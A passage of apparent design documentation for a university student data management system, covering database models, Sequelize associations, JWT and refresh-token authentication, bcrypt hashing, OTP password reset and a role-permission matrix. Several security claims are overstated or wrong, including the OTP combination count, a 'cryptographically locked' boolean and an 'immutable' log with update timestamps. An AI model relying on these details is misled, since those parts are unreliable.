  8. `program` (VARCHAR(255), NOT NULL): Academic degree program (e.g., `B.Tech`, `M.Tech`, `B.Tech + M.Tech`, `BCA`, `MCA`).
  9. `batch` (VARCHAR(255), NOT NULL): Enrolled academic year span (e.g., `2025-29`, `2024-28`, `2025-27`).
  10. `specialization` (VARCHAR(255), NOT NULL): Specific academic concentration or branch (e.g., `Artificial Intelligence`, `Data Science`, `Cyber Security`, `Core`).
  11. `fatherName` (VARCHAR(255), NOT NULL): Father's official name.
  12. `motherName` (VARCHAR(255), Nullable): Mother's official name.
  13. `gender` (VARCHAR(255), NOT NULL): Student gender (`Male`, `Female`, `Other`).
  14. `dob` (DATE, Nullable): Date of birth formatted as YYYY-MM-DD.
  15. `category` (VARCHAR(255), NOT NULL): Social/admission reservation category (`General`, `OBC`, `SC`, `ST`, `EWS`).
  16. `nationalId` (VARCHAR(255), Nullable): Government national identification number (e.g., Aadhaar number or Passport number).
  17. `mobile` (VARCHAR(255), NOT NULL): Primary student mobile contact number, stripped of spaces and country code prefixes.
  18. `email` (VARCHAR(255), NOT NULL): Official email address. Validated with `isEmail: true`.
  19. `address` (TEXT, Nullable): Permanent residential postal address.
  20. `hosteller` (VARCHAR(255), NOT NULL): Campus accommodation status (`Hosteller` or `Day Scholar`).
  21. `enrollmentStatus` (VARCHAR(255), Nullable, Default: 'Regular'): Institutional enrollment standing (`Regular`, `Provisional`, `Suspended`, `Alumni`).
  22. `admissionType` (VARCHAR(255), NOT NULL): Admission channel (`Entrance Examination`, `Direct Admission`, `Lateral Entry`, `Management Quota`).
  23. `twelfthCompartment` (VARCHAR(255), NOT NULL): Indicates whether the student cleared 12th standard via a compartment examination (`Yes` or `No`).
  24. `admissionYear` (VARCHAR(255), Nullable): The calendar year of matriculation (e.g., `2025`).
  25. `semesters` (JSON, NOT NULL, Default: `[]`): Array of semester registration objects. Schema per element: `{ semester: number, registered: "Registered" | "Not Registered" }`. The length of this array is validated against institutional program duration rules (8 semesters for B.Tech, 4 for M.Tech, 10 for Integrated).
  26. `yearCGPA` (JSON, NOT NULL, Default: `[]`): Array of cumulative grade point average objects for each academic year. Schema per element: `{ year: number, cgpa: number | null }`.
  27. `internshipStatus` (VARCHAR(255), NOT NULL, Default: 'Inactive'): Current practical training state (`Inactive`, `Searching`, `Ongoing`, `Completed`, `Not Applied`).
  28. `internshipCompany` (VARCHAR(255), Nullable): Name of the corporate organization or institution hosting the student's internship (e.g., `Google India`, `Amazon`, `TCS`).
  29. `internshipDOJ` (VARCHAR(50), Nullable): Date of Joining (DOJ) for internship commencement (stored as YYYY-MM-DD string).
  30. `internshipDOE` (VARCHAR(50), Nullable): Date of Ending (DOE) for internship completion.
  31. `internshipType` (VARCHAR(50), Nullable): Compensation structure (`Paid` or `Unpaid`).
  32. `placementStatus` (VARCHAR(255), NOT NULL, Default: 'Not Placed'): Campus recruitment outcome (`Placed`, `Not Placed`, `Higher Studies`, `Opted Out`).
  33. `placementCompany` (VARCHAR(255), Nullable): Name of the employing corporation that extended a full-time placement offer.
  34. `placementDOJ` (VARCHAR(50), Nullable): Scheduled corporate joining date (DOJ).
  35. `placementDOE` (VARCHAR(50), Nullable): Contract duration or bond expiration date (DOE).
  36. `placementType` (VARCHAR(50), Nullable): Employment compensation classification (`Paid` or `Unpaid`).
  37. `photo` (LONGTEXT, Nullable): Base64 Data URI or secure HTTP URL storing the student's passport-size photograph.
  38. `status` (ENUM('active', 'inactive'), NOT NULL, Default: 'active'): Lifecycle status of the student record. Inactive records represent de-registered or withdrawn students.
  39. `createdBy` (INTEGER, Foreign Key -> `users.id`, NOT NULL): ID of the administrator or coordinator who initialized the record.
  40. `updatedBy` (INTEGER, Foreign Key -> `users.id`, Nullable): ID of the user who executed the most recent write operation.
  41. `createdAt` (DATETIME, NOT NULL): System record creation timestamp.
  42. `updatedAt` (DATETIME, NOT NULL): Last record update timestamp.

### 2.3.3 Coordinator Model (`coordinators`)
- **Source File**: `backend/models/coordinator.model.js`
- **Database Table**: `coordinators`
- **Description**: Represents an academic faculty member assigned to coordinate a designated batch and class.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Primary numeric coordinator identifier.
  2. `userId` (INTEGER, Foreign Key -> `users.id`, Nullable): Linked authentication account holding `coordinator` role credentials.
  3. `name` (VARCHAR(255), NOT NULL): Full legal name of the coordinator.
  4. `email` (VARCHAR(255), Unique, NOT NULL): Institutional email address.
  5. `phone` (VARCHAR(255), NOT NULL): Mobile contact phone number.
  6. `school` (VARCHAR(255), NOT NULL): Assigned school (e.g., `soict`).
  7. `department` (VARCHAR(255), NOT NULL): Assigned department (e.g., `cse`).
  8. `program` (VARCHAR(255), NOT NULL): Academic degree program (e.g., `B.Tech`).
  9. `batch` (VARCHAR(255), NOT NULL): Academic cohort batch (e.g., `2025-29`).
  10. `specialization` (VARCHAR(255), Nullable): Specific branch concentration if assigned to a single section.
  11. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard audit timestamps.

### 2.3.4 Chairperson Model (`chairpersons`)
- **Source File**: `backend/models/chairperson.model.js`
- **Database Table**: `chairpersons`
- **Description**: Executive dean profile holding administrative oversight over an entire school.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Primary chairperson identifier.
  2. `userId` (INTEGER, Foreign Key -> `users.id`, Nullable): Linked authentication account holding `chairperson` role credentials.
  3. `name` (VARCHAR(255), NOT NULL): Legal name of the chairperson.
  4. `email` (VARCHAR(255), Unique, NOT NULL): Institutional email address.
  5. `phone` (VARCHAR(255), NOT NULL): Contact phone number.
  6. `school` (VARCHAR(255), NOT NULL): School governed (e.g., `soict`, `som`, `sovsas`).
  7. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard audit timestamps.

### 2.3.5 ChairpersonClass Model (`chairperson_classes`)
- **Source File**: `backend/models/chairpersonClass.model.js`
- **Database Table**: `chairperson_classes`
- **Description**: Relational junction mapping chairpersons to specific delegated classes when school-wide oversight is partitioned.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Junction primary key.
  2. `chairpersonId` (INTEGER, Foreign Key -> `chairpersons.id`, NOT NULL): Reference to parent chairperson.
  3. `school`, `department`, `program`, `batch`, `specialization` (VARCHAR(255), NOT NULL): Five-tuple composite class key.
  4. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard audit timestamps.

### 2.3.6 Faculty Model (`faculty`)
- **Source File**: `backend/models/faculty.model.js`
- **Database Table**: `faculty`
- **Description**: Master registry of university instructors eligible for teaching assignments and attendance marking.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Internal faculty identifier.
  2. `userId` (INTEGER, Foreign Key -> `users.id`, Nullable): Linked authentication account holding `faculty` role credentials.
  3. `name` (VARCHAR(255), NOT NULL): Full faculty member name with academic titles (e.g., `Dr. Ashish Kumar`).
  4. `email` (VARCHAR(255), Unique, NOT NULL): Faculty institutional email.
  5. `phone` (VARCHAR(255), NOT NULL): Contact phone number.
  6. `department` (VARCHAR(255), NOT NULL): Primary parent academic department.
  7. `designation` (VARCHAR(255), Nullable): Academic rank (`Assistant Professor`, `Associate Professor`, `Professor`, `Visiting Faculty`).
  8. `qualifications` (VARCHAR(255), Nullable): Academic credentials (e.g., `Ph.D. in Computer Science, M.Tech`).
  9. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard audit timestamps.

### 2.3.7 FacultyAssignment Model (`faculty_assignments`)
- **Source File**: `backend/models/facultyAssignment.model.js`
- **Database Table**: `faculty_assignments`
- **Description**: Binds an instructor to teach a specific subject in a specific class during a given academic semester.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Assignment identifier.
  2. `facultyId` (INTEGER, Foreign Key -> `faculty.id`, NOT NULL): Reference to instructor.
  3. `subjectId` (INTEGER, Foreign Key -> `subjects.id`, NOT NULL): Reference to taught subject.
  4. `school`, `department`, `program`, `batch`, `specialization` (VARCHAR(255), NOT NULL): Target class key.
  5. `academicYear` (VARCHAR(50), NOT NULL): Current academic calendar year (e.g., `2025-2026`).
  6. `semester` (INTEGER, NOT NULL): Academic semester index (1 through 10).
  7. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard audit timestamps.

### 2.3.8 Subject Model (`subjects`)
- **Source File**: `backend/models/subject.model.js`
- **Database Table**: `subjects`
- **Description**: Institutional course catalog defining curricula subjects, credit weights, and course codes.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Primary subject identifier.
  2. `code` (VARCHAR(50), Unique, NOT NULL): Course identification code (e.g., `CS101`, `CS302`).
  3. `name` (VARCHAR(255), NOT NULL): Full subject descriptive title (e.g., `Data Structures & Algorithms`).
  4. `department` (VARCHAR(255), NOT NULL): Department managing the course syllabus.
  5. `semester` (INTEGER, NOT NULL): Target semester level.
  6. `credits` (INTEGER, NOT NULL, Default: 4): Academic credit value.
  7. `type` (VARCHAR(50), NOT NULL, Default: 'Theory'): Instructional classification (`Theory`, `Practical / Lab`, `Seminar`).
  8. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard audit timestamps.

### 2.3.9 AttendanceSession Model (`attendance_sessions`)
- **Source File**: `backend/models/attendanceSession.model.js`
- **Database Table**: `attendance_sessions`
- **Description**: Represents a scheduled classroom lecture or lab period where attendance was captured.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Unique session identifier.
  2. `teacherId` (INTEGER, Foreign Key -> `users.id` / `faculty.id`, NOT NULL): Instructor who conducted and marked the session.
  3. `subjectId` (INTEGER, Foreign Key -> `subjects.id`, NOT NULL): Course subject taught.
  4. `classKey` (VARCHAR(255), NOT NULL): Composite class key (`school|department|program|batch|specialization`).
  5. `date` (DATEONLY, NOT NULL): Calendar date of lecture (YYYY-MM-DD).
  6. `slot` (VARCHAR(50), NOT NULL): Time slot identifier (e.g., `09:00 - 10:00 AM`, `Slot 1`).
  7. `room` (VARCHAR(50), Nullable): Lecture hall or laboratory code (e.g., `L-101`, `Lab 3`).
  8. `isLocked` (BOOLEAN, NOT NULL, Default: false): When true, the session is cryptographically locked; faculty cannot modify records without administrative override.
  9. `lockedAt` (DATETIME, Nullable): Timestamp when the session was finalized and submitted.
  10. `lockedBy` (INTEGER, Foreign Key -> `users.id`, Nullable): User who performed the lock operation.
  11. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard audit timestamps.

### 2.3.10 AttendanceRecord Model (`attendance_records`)
- **Source File**: `backend/models/attendanceRecord.model.js`
- **Database Table**: `attendance_records`
- **Description**: Individual student attendance status for a specific `attendance_session`.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Primary record identifier.
  2. `sessionId` (INTEGER, Foreign Key -> `attendance_sessions.id`, NOT NULL, CASCADE ON DELETE): Parent session.
  3. `studentId` (INTEGER, Foreign Key -> `students.id`, NOT NULL): Referenced student record.
  4. `rollNo` (VARCHAR(255), NOT NULL): Denormalized student roll number for high-performance reporting.
  5. `status` (ENUM('Present', 'Absent', 'Excused'), NOT NULL, Default: 'Present'): Captured attendance state.
  6. `remarks` (TEXT, Nullable): Optional instructor notes (e.g., `Medical Leave Approved`, `Late Arrival`).
  7. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard audit timestamps.

### 2.3.11 Timetable Model (`timetables`)
- **Source File**: `backend/models/timetable.model.js`
- **Database Table**: `timetables`
- **Description**: Root weekly schedule configuration for a class cohort.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Timetable identifier.
  2. `school`, `department`, `program`, `batch`, `specialization` (VARCHAR(255), NOT NULL): Composite class key.
  3. `academicYear` (VARCHAR(50), NOT NULL): Calendar academic span (e.g., `2025-26`).
  4. `semester` (INTEGER, NOT NULL): Semester index.
  5. `isActive` (BOOLEAN, NOT NULL, Default: true): Indicates if this schedule is currently operational.
  6. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard audit timestamps.

### 2.3.12 TimetableSection Model (`timetable_sections`)
- **Source File**: `backend/models/timetableSection.model.js`
- **Database Table**: `timetable_sections`
- **Description**: Scheduled lecture slot within a timetable.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Slot identifier.
  2. `timetableId` (INTEGER, Foreign Key -> `timetables.id`, NOT NULL, CASCADE ON DELETE): Parent timetable.
  3. `dayOfWeek` (ENUM('Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'), NOT NULL): Day of schedule.
  4. `startTime` (TIME, NOT NULL): Slot commencement time.
  5. `endTime` (TIME, NOT NULL): Slot conclusion time.
  6. `subjectId` (INTEGER, Foreign Key -> `subjects.id`, NOT NULL): Scheduled subject.
  7. `facultyId` (INTEGER, Foreign Key -> `faculty.id`, Nullable): Assigned instructor.
  8. `room` (VARCHAR(50), NOT NULL): Classroom or lab location.
  9. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard audit timestamps.

### 2.3.13 Specialization Model (`specializations`)
- **Source File**: `backend/models/specialization.model.js`
- **Database Table**: `specializations`
- **Description**: Master catalog of academic branch specializations offered within departments.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Primary identifier.
  2. `school` (VARCHAR(255), NOT NULL): Parent school code.
  3. `department` (VARCHAR(255), NOT NULL): Parent department code.
  4. `program` (VARCHAR(255), NOT NULL): Degree program title.
  5. `batch` (VARCHAR(255), NOT NULL): Target batch year.
  6. `name` (VARCHAR(255), NOT NULL): Branch title (e.g., `Artificial Intelligence`, `Cyber Security`).
  7. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard audit timestamps.

### 2.3.14 Message Model (`messages`)
- **Source File**: `backend/models/message.model.js`
- **Database Table**: `messages`
- **Description**: Institutional broadcast or direct message header and body.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Message primary key.
  2. `senderId` (INTEGER, Foreign Key -> `users.id`, NOT NULL): Originating user account.
  3. `title` (VARCHAR(255), NOT NULL): Subject line or headline.
  4. `content` (TEXT, NOT NULL): Full body text of the announcement or direct message.
  5. `targetType` (ENUM('class', 'individual', 'universal', 'admin', 'coordinator'), NOT NULL): Broadcast scoping rule.
  6. `targetClass` (VARCHAR(255), Nullable): Specific class key recipient when `targetType === 'class'`.
  7. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Timestamp of message dispatch.

### 2.3.15 MessageRecipient Model (`message_recipients`)
- **Source File**: `backend/models/messageRecipient.model.js`
- **Database Table**: `message_recipients`
- **Description**: Delivery junction mapping messages to specific recipient users with read status telemetry.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Delivery identifier.
  2. `messageId` (INTEGER, Foreign Key -> `messages.id`, NOT NULL, CASCADE ON DELETE): Parent message.
  3. `recipientId` (INTEGER, Foreign Key -> `users.id`, NOT NULL): Recipient user account.
  4. `isRead` (BOOLEAN, NOT NULL, Default: false): Indicates whether the recipient has opened the message.
  5. `readAt` (DATETIME, Nullable): Timestamp when the message was marked as read.
  6. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Standard delivery audit timestamps.

### 2.3.16 ChangeLog Model (`change_logs`)
- **Source File**: `backend/models/changeLog.model.js`
- **Database Table**: `change_logs`
- **Description**: Immutable append-only audit ledger recording all administrative and coordinator data modifications.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Primary audit log identifier.
  2. `userId` (INTEGER, Foreign Key -> `users.id`, NOT NULL): Actor who initiated the change.
  3. `action` (VARCHAR(50), NOT NULL): Operation type (`create`, `update`, `delete`, `bulk_update`, `upload_photos`).
  4. `entity` (VARCHAR(50), NOT NULL): Target domain entity (`student`, `attendance`, `coordinator`).
  5. `entityId` (VARCHAR(255), NOT NULL): Business key of affected record (e.g., student Roll Number `255ucs258`).
  6. `details` (JSON, NOT NULL): Structured JSON snapshot capturing:
     - `before`: Full entity state prior to alteration.
     - `after`: Full entity state resulting from alteration.
     - `ipAddress`: Client IP address.
     - `userAgent`: Client user-agent string.
  7. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Tamper-proof timestamp of audit creation.

### 2.3.17 Notification Model (`notifications`)
- **Source File**: `backend/models/notification.model.js`
- **Database Table**: `notifications`
- **Description**: Real-time alerts and high-priority institutional notices dispatched to specific roles or users.
- **Fields Definition**:
  1. `id` (INTEGER, Primary Key, Auto Increment, NOT NULL): Notification identifier.
  2. `toRole` (VARCHAR(50), Nullable): Target role broadcast filter (`admin`, `coordinator`, `faculty`, `student`).
  3. `toUserId` (INTEGER, Foreign Key -> `users.id`, Nullable): Targeted individual recipient ID.
  4. `message` (TEXT, NOT NULL): Alert message body text.
  5. `data` (JSON, Nullable): Auxiliary payload (entity links, action routes, sender identifiers).
  6. `isRead` (BOOLEAN, NOT NULL, Default: false): Read acknowledgment flag.
  7. `createdAt` & `updatedAt` (DATETIME, NOT NULL): Notification delivery timestamp.

---

## 2.4 Model Associations, Cascade Rules & Lifecycle Hooks

The centralized model registry in `backend/models/index.js` explicitly establishes entity relationships, foreign keys, and referential actions:

1. **User to Profile Associations (1:1 / 1:N)**:
   - `User.hasOne(Student, { foreignKey: 'userId', as: 'student', constraints: false });`
   - `Student.belongsTo(User, { foreignKey: 'userId', as: 'user', constraints: false });`
   - `User.hasOne(Coordinator, { foreignKey: 'userId', as: 'coordinator', constraints: false });`
   - `Coordinator.belongsTo(User, { foreignKey: 'userId', as: 'user', constraints: false });`
   - `User.hasOne(Chairperson, { foreignKey: 'userId', as: 'chairperson', constraints: false });`
   - `Chairperson.belongsTo(User, { foreignKey: 'userId', as: 'user', constraints: false });`
   - `User.hasOne(Faculty, { foreignKey: 'userId', as: 'faculty', constraints: false });`
   - `Faculty.belongsTo(User, { foreignKey: 'userId', as: 'user', constraints: false });`

2. **Faculty Assignment Associations (N:M via Junction)**:
   - `Faculty.hasMany(FacultyAssignment, { foreignKey: 'facultyId', as: 'assignments', onDelete: 'CASCADE' });`
   - `FacultyAssignment.belongsTo(Faculty, { foreignKey: 'facultyId', as: 'faculty' });`
   - `Subject.hasMany(FacultyAssignment, { foreignKey: 'subjectId', as: 'assignments', onDelete: 'CASCADE' });`
   - `FacultyAssignment.belongsTo(Subject, { foreignKey: 'subjectId', as: 'subject' });`

3. **Attendance Session & Record Associations (1:N with Cascade)**:
   - `AttendanceSession.hasMany(AttendanceRecord, { foreignKey: 'sessionId', as: 'records', onDelete: 'CASCADE' });`
   - `AttendanceRecord.belongsTo(AttendanceSession, { foreignKey: 'sessionId', as: 'session' });`
   - `Student.hasMany(AttendanceRecord, { foreignKey: 'studentId', as: 'attendanceRecords', constraints: false });`
   - `AttendanceRecord.belongsTo(Student, { foreignKey: 'studentId', as: 'student' });`
   - `AttendanceSession.belongsTo(Subject, { foreignKey: 'subjectId', as: 'subject' });`
   - `AttendanceSession.belongsTo(User, { foreignKey: 'teacherId', as: 'teacher' });`

4. **Messaging & Recipient Associations (1:N with Cascade)**:
   - `Message.hasMany(MessageRecipient, { foreignKey: 'messageId', as: 'recipients', onDelete: 'CASCADE' });`
   - `MessageRecipient.belongsTo(Message, { foreignKey: 'messageId', as: 'message' });`
   - `User.hasMany(MessageRecipient, { foreignKey: 'recipientId', as: 'receivedMessages', constraints: false });`
   - `MessageRecipient.belongsTo(User, { foreignKey: 'recipientId', as: 'recipient' });`
   - `Message.belongsTo(User, { foreignKey: 'senderId', as: 'sender' });`

5. **Timetable Associations (1:N with Cascade)**:
   - `Timetable.hasMany(TimetableSection, { foreignKey: 'timetableId', as: 'sections', onDelete: 'CASCADE' });`
   - `TimetableSection.belongsTo(Timetable, { foreignKey: 'timetableId', as: 'timetable' });`
   - `TimetableSection.belongsTo(Subject, { foreignKey: 'subjectId', as: 'subject' });`
   - `TimetableSection.belongsTo(Faculty, { foreignKey: 'facultyId', as: 'faculty' });`



---

# SECTION 3: Authentication, Authorization & Security Architecture

## 3.1 Dual-Token Authentication Engine

The Gautam Buddha University Student Data Management System (GBU-SDSM) implements an enterprise-grade stateless authentication engine built on the JSON Web Token (JWT) specification (RFC 7519). Authentication tokens represent cryptographically verifiable claims issued by the central identity authority upon successful credential verification.

```mermaid
sequenceDiagram
    autonumber
    actor User as Client (Browser / Agent)
    participant AuthRouter as Express Router (/api/auth)
    participant AuthCtrl as AuthController
    participant Bcrypt as bcryptjs Engine
    participant DB as MySQL Database
    participant JWT as jsonwebtoken Engine

    User->>AuthRouter: POST /api/auth/login { identifier, password, role }
    AuthRouter->>AuthCtrl: login(req, res, next)
    AuthCtrl->>DB: User.findOne({ where: { [Op.or]: [{ email }, { username }, { enrollmentNo }] } })
    DB-->>AuthCtrl: userRecord (with passwordHash, salt, status)
    
    alt User Not Found or Inactive
        AuthCtrl-->>User: 401 Unauthorized { success: false, message: "Invalid credentials or account inactive" }
    else User Exists & Active
        AuthCtrl->>Bcrypt: compare(plaintextPassword, userRecord.passwordHash)
        Bcrypt-->>AuthCtrl: isMatch (boolean)
        alt Password Mismatch
            AuthCtrl->>DB: Increment failedLoginAttempts (Lock if > 5)
            AuthCtrl-->>User: 401 Unauthorized { success: false, message: "Invalid credentials" }
        else Password Valid
            AuthCtrl->>JWT: sign({ id, role, email, program, branch, section }, ACCESS_SECRET, { expiresIn: '15m' })
            JWT-->>AuthCtrl: accessToken
            AuthCtrl->>JWT: sign({ id, tokenVersion }, REFRESH_SECRET, { expiresIn: '7d' })
            JWT-->>AuthCtrl: refreshToken
            AuthCtrl->>DB: Update lastLoginAt, reset failedLoginAttempts
            AuthCtrl-->>User: 200 OK + Set-Cookie: refreshToken (HttpOnly, Secure, SameSite=Strict) + JSON { accessToken, user }
        end
    end
```

### 3.1.1 Access Token Architecture
- **Cryptographic Algorithm**: HMAC using SHA-256 (`HS256`), parameterized by the `JWT_SECRET` environment variable.
- **Payload Claims Schema**:
  ```json
  {
    "id": 142,
    "email": "faculty.cs@gbu.ac.in",
    "role": "faculty",
    "name": "Dr. Ramesh Sharma",
    "program": "B.Tech",
    "branch": "Computer Science and Engineering",
    "section": "A",
    "department": "CSE",
    "iat": 1757053200,
    "exp": 1757054100
  }
  ```
- **Lifespan**: Short-lived TTL (Time-To-Live) of 15 minutes (`900 seconds`) or 1 hour depending on deployment environment configuration. Short lifespans minimize the exploitation window should an access token be intercepted in transit.
- **Transmission Vector**: Clients transmit the access token within the HTTP `Authorization` request header using standard Bearer token formatting:
  `Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`
- **Verification Engine**: Express middleware (`middleware/authMiddleware.js`) intercepts incoming HTTP traffic, parses the Bearer string, executes `jwt.verify(token, process.env.JWT_SECRET)`, catches `TokenExpiredError` or `JsonWebTokenError`, and populates `req.user` with the decoded claims.

### 3.1.2 Refresh Token Architecture
- **Cryptographic Algorithm**: HMAC SHA-256 (`HS256`), parameterized by a segregated `REFRESH_TOKEN_SECRET` environment variable.
- **Payload Claims Schema**:
  ```json
  {
    "id": 142,
    "tokenVersion": 3,
    "iat": 1757053200,
    "exp": 1757658000
  }
  ```
- **Lifespan**: Long-lived TTL of 7 days (`604800 seconds`).
- **Storage Strategy**: Transmitted via HTTP-only, `Secure` (in production HTTPS), `SameSite=Strict` cookie named `refreshToken`. This architectural decision renders the refresh token completely immune to Cross-Site Scripting (XSS) document object model exfiltration.
- **Rotation and Revocation Mechanism**: Every invocation of the `POST /api/auth/refresh-token` endpoint triggers automatic token rotation. The server validates the existing refresh token, checks that `userRecord.tokenVersion` matches the token's `tokenVersion` claim, increments `tokenVersion` in the database, generates a brand new refresh token, and issues a fresh 15-minute access token. If a compromised refresh token is reused after rotation, the token version mismatch immediately flags the session, invalidating all active sessions for that account.

---

## 3.2 Password Hashing, Salting & Cryptographic Standards

GBU-SDSM strictly adheres to modern cryptographic standards for credential security, prohibiting any plaintext or reversibly encrypted password storage.

### 3.2.1 bcryptjs Salting & Key Derivation
- **Algorithm**: The Blowfish-based adaptive key derivation function (`bcrypt`).
- **Cost Factor / Salt Rounds**: Configured to `10` rounds ($2^{10} = 1024$ iterations). This provides an optimal equilibrium between cryptographic defense against specialized FPGA/ASIC offline brute-force attacks (~80-120ms computation per verification on modern CPUs) and server throughput during concurrent login spikes.
- **Salt Generation**: Cryptographically secure pseudo-random salt generated via `bcrypt.genSaltSync(10)`.
- **Model Hook Lifecycle**: Password hashing is encapsulated directly within the Sequelize `User` model lifecycle hooks (`beforeCreate`, `beforeUpdate`). Whenever the `password` attribute is marked as dirty or changed, the hook transparently executes:
  ```javascript
  user.password = await bcrypt.hash(user.password, 10);
  ```
- **Constant-Time Verification**: Password verification uses `bcrypt.compare(candidatePassword, storedHash)`, ensuring constant-time character comparison to eliminate timing side-channel attacks.

### 3.2.2 One-Time Password (OTP) Generation & Password Reset Workflow
- **Entropy Source**: Cryptographically secure pseudorandom number generation using Node.js native `crypto.randomInt(100000, 999999)` producing a 6-digit numeric OTP with $10^6$ equiprobable combinations.
- **Time-To-Live (TTL)**: OTP values are stored alongside an explicit timestamp:
  ```javascript
  user.resetPasswordOtp = generatedOtp;
  user.resetPasswordExpires = new Date(Date.now() + 10 * 60 * 1000); // 10-Minute Expiry
  ```
- **Verification and Invalidation**: Upon verification via `POST /api/auth/verify-reset-otp`, the system checks:
  1. `user.resetPasswordOtp === submittedOtp`
  2. `new Date() < user.resetPasswordExpires`
  Upon successful validation and subsequent password update, both `resetPasswordOtp` and `resetPasswordExpires` are set to `null` within an atomic database transaction, preventing OTP reuse or replay attacks.

---

## 3.3 Role-Based Access Control (RBAC) Matrix & Permission Hierarchy

GBU-SDSM enforces strict multi-tenant authorization partitions. The platform categorizes all actors into five distinct roles, mapped to an explicit privilege hierarchy:

```
Level 5: admin (Super Administrator - Unrestricted Domain Authority)
Level 4: chairperson (Departmental Executive - Program & Cross-Class Authority)
Level 3: coordinator (Batch Supervisor - Specific Class/Section Authority)
Level 2: faculty (Instructor - Assigned Course & Attendance Authority)
Level 1: student / client (End-User - Self Data & Read-Only Domain Authority)
```

### 3.3.1 Master Privilege Comparison Matrix

| Operational Capability / Action | Admin | Chairperson | Coordinator | Faculty | Student |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **System Configuration & Maintenance** | Full | None | None | None | None |
| **Manage Academic Programs & Branches** | Full | Read/Assign | Read-Only | None | None |
| **Create / Import New Students (Excel Bulk)** | Full | Allowed | Allowed | None | None |
| **View Student Profile & Demographics** | Universal | Assigned Dept | Assigned Class | Assigned Class | Own Only |
| **Edit Student Profile (Single Record)** | Universal | Assigned Dept | Assigned Class | None | Limited Own |
| **Bulk Edit Student Records** | Universal | Assigned Dept | Assigned Class | None | None |
| **Delete Student Record** | Full | None | None | None | None |
| **Export Student Data (CSV / Excel)** | Universal | Departmental | Assigned Class | None | None |
| **View Internship & Placement Records** | Universal | Departmental | Assigned Class | Assigned Class | Own Only |
| **Edit Placement / Package / Company Info** | Universal | Departmental | Assigned Class | None | Own Profile |
| **Create Coordinator Accounts** | Full | None | None | None | None |
| **Assign Classes to Coordinator** | Full | None | None | None | None |
| **Create Chairperson Accounts** | Full | None | None | None | None |
| **Assign Programs to Chairperson** | Full | None | None | None | None |
| **Create / Manage Faculty Profiles** | Full | Departmental | View Only | View Own | None |
| **Create Faculty Teaching Assignments** | Full | Departmental | Assigned Class | None | None |
| **Mark Class Attendance Sessions** | Full (Override) | Full (Override) | Assigned Class | Assigned Class | None |
| **Edit Historical Attendance Records** | Full | Departmental | Assigned Class | Assigned (24h) | None |
| **Lock / Finalize Attendance Session** | Full | Departmental | Assigned Class | Assigned Class | None |
| **View Live Attendance Statistics & Percentages** | Universal | Departmental | Assigned Class | Assigned Class | Own Only |
| **Export Attendance Reports (PDF / Excel)** | Universal | Departmental | Assigned Class | Assigned Class | Own Only |
| **Upload Course Timetable / Class Schedule** | Full | Departmental | Assigned Class | None | None |
| **Broadcast System-Wide Notifications** | Full | None | None | None | None |
| **Send Departmental Broadcast Messages** | Full | Full | None | None | None |
| **Send Class-Specific Messages** | Full | Full | Full | Assigned Class | None |
| **Send Direct Peer Messages (Faculty to Admin)**| Allowed | Allowed | Allowed | Allowed | None |
| **View System Audit Logs** | Full | None | None | None | None |

---

## 3.4 Express Middleware Pipeline Architecture

Every incoming HTTP request traverses a specialized sequence of Express middleware layers designed to filter, sanitize, authenticate, authorize, and audit every interaction before it reaches controller business logic.

```mermaid
flowchart LR
    A[Inbound Request] --> B[Security Headers: Helmet]
    B --> C[CORS Engine]
    C --> D[Rate Limiter: express-rate-limit]
    D --> E[Body Parsers: express.json / urlencoded]
    E --> F[Request Logger: Correlation ID]
    F --> G[Auth Middleware: JWT Verification]
    G --> H[Role Middleware: RBAC Enforcement]
    H --> I[Multipart Handler: Multer]
    I --> J[Controller Business Logic]
```

### 3.4.1 Authentication Middleware (`middleware/authMiddleware.js`)
The authentication middleware is the primary gatekeeper for all protected API routes. Its operational procedure is as follows:
1. **Header Extraction**: Inspects the `req.headers.authorization` string.
2. **Format Verification**: Asserts that the string starts with the literal prefix `"Bearer "`. If absent, immediately returns HTTP `401 Unauthorized` with payload `{ success: false, message: "Authorization header missing or improperly formatted" }`.
3. **Cryptographic Validation**: Invokes `jwt.verify(token, process.env.JWT_SECRET)`.
   - If `TokenExpiredError` is thrown: Returns HTTP `401` with code `TOKEN_EXPIRED` alerting the frontend interceptor to invoke the refresh pipeline.
   - If `JsonWebTokenError` is thrown: Returns HTTP `401` with message `"Invalid token signature"`.
4. **Database Identity Synchronization**: Queries the `User` model by the decoded `id` to verify that:
   - The user record continues to exist in the database.
